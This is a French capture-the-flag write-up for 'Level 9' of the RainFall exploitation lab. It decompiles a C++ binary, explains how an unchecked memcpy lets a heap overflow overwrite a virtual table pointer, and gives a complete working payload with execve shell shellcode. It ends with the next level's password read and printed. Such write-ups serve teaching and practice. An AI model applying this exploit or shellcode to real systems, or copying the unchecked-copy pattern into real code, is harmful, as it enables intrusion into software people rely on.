# Level 9

Voici le code decompile:

```C++
#include <cstddef>
#include <cstring>

class N
{
    public:
        N(int param1)
        {
            attr = param1;
            return;
        }

        void setAnnotation(char *str)
        {
            size_t n = strlen(str);
            memcpy(this + 4, str, n);
            return;
        }

        virtual int operator+(N &inst)
        {
            return inst.attr + attr;
        }

        virtual int operator-(N &inst)
        {
            return inst.attr - attr;
        }

        int attr;
};

int main(int ac, char **av)
{
    N *inst;
    N *inst1;

    if (ac < 2)
    {
        _exit(1);
    }
    inst = new N(5);
    inst1 = new N(6);
    inst->setAnnotation(av[1]);

    (*inst) + (*inst1);
    return 0;
}
```

C'est un binaire ecrit en C++. Ici nous allons devoir ecraser le `vptr` de `inst2` pour appeler un shellcode. Le compilateur C++ ajoute en debut de classe un pointeur virtuel (`vptr`) qui pointe vers la `vtable`. Cette table reference ensuite les definitions des fonctions virtuelles du code. Le `vptr` est en quelque sorte un pointeur sur pointeur `**vptr`. Dans le pseudo-code de Ghidra nous pouvons voir que chaque instance prend 108 octets d'espace sur la heap:

```C++
this = operator.new(0x6c); //0x6c == 108
N::N(this,5);
```

Donc nous savons que pour atteindre le `vptr` de `inst2` nous allons devoir overflow de 108. Ensuite en sachant que le `vptr` est un pointeur sur pointeur, on sait qu'il faut dereferencer 2 fois pour executer du code. Il va falloir donc donner dans notre payload une adresse qui pointe sur une adresse qui pointe sur notre shellcode. Nous pouvons nous servir de notre buffer pour ceci. Grace a gdb nous pouvons avoir l'adresse du contenu de notre buffer dans la heap:

```bash
level9@RainFall:~$ gdb ./level9
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) break *main+136
Breakpoint 1 at 0x804867c
(gdb) run aaaa
Starting program: /home/user/level9/level9 aaaa

Breakpoint 1, 0x0804867c in main ()
(gdb) x $eax
0x804a00c:      0x61616161
```

Donc voici les adresses dont nous allons avoir besoin:
 - `0x0804a00c` -> Adresse de notre buffer (nous allons ecraser `vptr` par cette valeur)
 - `0x0804a010` -> Adresse du debut de notre shellcode. Presente au debut du buffer pour pouvoir deferencer deux fois

 A partir de ces informations nous pouvons construire notre payload comme ceci:
  - `\x10\xa0\x04\x08`: Adresse du debut de notre shellcode:
  - `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`: Notre shellcode
  - `A * 83`: 108 - (Taille de notre adresse + shellcode) = 83
  - `\x0c\xa0\x04\x08`: adresse du debut du buffer

```bash
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 83 + "\x0c\xa0\x04\x08"')
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
